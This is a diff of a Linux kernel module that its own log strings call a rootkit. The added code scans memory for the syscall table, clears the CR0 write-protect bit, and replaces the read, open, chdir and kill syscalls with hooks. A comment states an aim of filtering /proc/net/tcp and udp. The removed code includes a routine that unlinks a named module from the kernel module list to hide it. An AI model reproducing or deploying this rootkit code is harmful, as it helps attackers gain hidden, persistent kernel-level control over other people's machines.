@@ -1,68 +1,75 @@
 #include "RTmain.h"
+#include "RTsyscalltable.h"
 
+static void disable_write_protection(void);
+static void enable_write_protection(void);
+static unsigned long **sys_call_table;
 
-unsigned int rtpid = -1;
-unsigned int rtfd = -1;
+// sys_read - 3
+RT_SYSCALL_DEFINE(long, read, unsigned int fd,
+        char __user *buf, size_t count) {
+    int ret;
 
-struct list_head * module_list_head = NULL;
-long clone_pid = 0;
-long clone_flag = 0;
-long clone_count = 0;
-long clone_tid = 0;
-long clone_lasttid = 0;
-
-long vfork_pid = 0;
-long vfork_flag = 0;
-long vfork_count = 0;
-long vfork_spid = 0;
-long vfork_lastpid = 0;
-long process_count = 0;
-
-
-
-
-typedef struct {
-    int pid;
-    int count;
-    long lastcall;
-
-} PROC_RECORD;
-PROC_RECORD pred[10];
-
-void
-del_lkm(const char *name) {
-    struct module * pmod;
-    struct list_head *plist;
-    //struct list_head *plisthead;
-
-    if (module_list_head == NULL) {
-        module_list_head = &__this_module.list;
-    }
-
-    plist = module_list_head;
-
-    while (plist) {
-        pmod = list_entry(plist, struct module, list);
-        if (!strcmp(name, pmod->name)) {
-            if (module_list_head == plist) {
-                module_list_head = module_list_head->prev;
-            }
-
-            plist->next->prev = plist->prev;
-            plist->prev->next = plist->next;
-
-            break;
-        }
-
-        plist = plist->prev;
-
-        if (plist == module_list_head) {
-            break;
-        }
-    }
+#ifdef DEBUG  
+    printk("read:fs:[%d],count:[%d]\n",fd,count);
+#endif
+    
+    ret = RT_SYSCALL_CALL(read, fd, buf, count);
+    return ret;
 }
 
-// int init_module(const char *name, struct module *image);
+/**
+ * sys_open - 5
+ * 只检查打开的文件是否是 /proc/net/tcp 或 /proc/net/udp，否则调用正常中断
+ */
+RT_SYSCALL_DEFINE(long, open, const char __user *filename,
+        int flags, int mode) {
+    int ret;
+
+#ifdef DEBUG    
+    char kfileName[MAX_PATH];
+    memset(kfileName, 0, MAX_PATH);
+    if (!copy_from_user(kfileName, filename, strnlen_user(filename, MAX_PATH))) {
+        printk("open:filename:[%s]flags:[%d]mode:[%d]\n", kfileName, flags, mode);
+    } else {
+        printk("open:copy_from_user failure~~\n");
+    }
+#endif       
+
+    ret = RT_SYSCALL_CALL(open, filename, flags, mode);
+    return ret;
+}
+
+// sys_chdir - 12
+RT_SYSCALL_DEFINE(long, chdir, const char __user *filename) {
+    int ret;
+
+#ifdef DEBUG    
+    char kfileName[MAX_PATH];
+    memset(kfileName, 0, MAX_PATH);
+    if (!copy_from_user(kfileName, filename, strnlen_user(filename, MAX_PATH))) {
+        printk("chdir:filename:[%s]\n", kfileName);
+    } else {
+        printk("chdir:copy_from_user failure~~\n");
+    }
+#endif   
+
+    ret = RT_SYSCALL_CALL(chdir, filename);
+    return ret;
+}
+// sys_kill - 37
+RT_SYSCALL_DEFINE(long, kill, int pid, int sig) {
+    long ret = 0;
+
+#ifdef DEBUG  
+    printk("kill:pid:[%d],sig:[%d]\n",pid,sig);
+#endif
+    
+    ret = RT_SYSCALL_CALL(kill, pid, sig);
+    return ret;
+}
+
+
 
 RT_SYSCALL_DEFINE(long, init_module, void __user *umod, unsigned long len,
         const char __user *uargs) {
@@ -89,31 +96,6 @@ RT_SYSCALL_DEFINE(long, getdents64, unsigned int fd,
     return ret;
 }
 
-RT_SYSCALL_DEFINE(long, chdir, const char __user *filename) {
-    int ret;
-    ret = RT_SYSCALL_CALL(chdir, filename);
-    return ret;
-}
-
-// sys_read
-
-RT_SYSCALL_DEFINE(long, read, unsigned int fd,
-        char __user *buf, size_t count) {
-    int ret;
-    ret = RT_SYSCALL_CALL(read, fd, buf, count);
-    return ret;
-}
-
-/**
- * sys_open
- * 只检查打开的文件是否是 /proc/net/tcp 或 /proc/net/udp，否则调用正常中断
- */
-RT_SYSCALL_DEFINE(long, open, const char __user *filename,
-        int flags, int mode) {
-    int ret;
-    ret = RT_SYSCALL_CALL(open, filename, flags, mode);
-    return ret;
-}
 
 /**
  * sys_getpgid - 20号
@@ -219,24 +201,13 @@ RT_SYSCALL_DEFINE(int, waitpid, pid_t pid, int __user *stat_addr, int options) {
     return ret;
 }
 
-RT_SYSCALL_DEFINE(long, kill, int pid, int sig) {
-    long ret = 0;
-    ret = RT_SYSCALL_CALL(kill, pid, sig);
-    return ret;
-}
 
 
 static unsigned long **find_sys_call_table(void) {
     unsigned long vaddr_number;
 
-    /* We want this pointer to point to the sys_call_table. */
     unsigned long **p;
 
-    /*
-     * It seems that the virtual address of the sys_call_table is always between
-     * the virtual address of the sys_close and the virtual address of the loops_per_jiffy,
-     * so we can search this area to find the sys_call_table.
-     */
     for (vaddr_number = (unsigned long) sys_close;
             vaddr_number < (unsigned long) &loops_per_jiffy;
             vaddr_number += sizeof (void *)) {
@@ -245,47 +216,64 @@ static unsigned long **find_sys_call_table(void) {
             return p;
     }
 
-    /* If this function cannot find the virtual address 
-     * of sys_call_table, it will return NULL. 
-     */
     return NULL;
+}
+
+static void disable_write_protection(void) {
+    unsigned long cr0 = read_cr0();
+    clear_bit(16, &cr0);
+    write_cr0(cr0);
+    DLog("disable_write_protection");
+}
+
+static void enable_write_protection(void) {
+    unsigned long cr0 = read_cr0();
+    set_bit(16, &cr0);
+    write_cr0(cr0);
+    DLog("enable_write_protection");
 }
 
 static int __init
 ThisInit(void) {
-    rtprint("init function");
+    DLog("rootkit init");
 
     sys_call_table = find_sys_call_table();
+    if (NULL != sys_call_table) {
+        DLog("get sys_call_table success![0x%x]", (unsigned int) sys_call_table);
+    } else {
+        DLog("get sys_call_table failure!");
+        return -1;
+    }
 
+    disable_write_protection();
+    
+    RT_SYSCALL_REPLACE(read); //3
+    RT_SYSCALL_REPLACE(open); //5    
+    RT_SYSCALL_REPLACE(chdir); //12
+    RT_SYSCALL_REPLACE(kill); //37
 
-    rtprint("sys_call_table = find_sys_call_table() finished!");
-
-    rtprint("addr_do_fork = find_do_fork() finished!");
-
-
-    rtprint("disable_write_protection");
-
-
-    rtprint("enable_write_protection");
-    rtprint("Leave init function");
+    enable_write_protection();
 
     return 0;
 }
 
 static void __exit
 ThisExit(void) {
-    rtprint("Enter exit function");
 
+    disable_write_protection();
 
-    rtprint("disable_write_protection");
+    RT_SYSCALL_RESTORE(read); //3
+    RT_SYSCALL_RESTORE(open); //5   
+    RT_SYSCALL_RESTORE(chdir); //12
+    RT_SYSCALL_RESTORE(kill); //37
 
-    rtprint("enable_write_protection");
-    rtprint("Leave exit function");
+    enable_write_protection();
+
+    DLog("rootkit exit");
 }
-
-MODULE_LICENSE("GPL");
 
 module_init(ThisInit); //模块入口函数
 module_exit(ThisExit); //模块出口函数
-
-
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("youyifeng");
+MODULE_DESCRIPTION("This module can hook the sys_* function.");
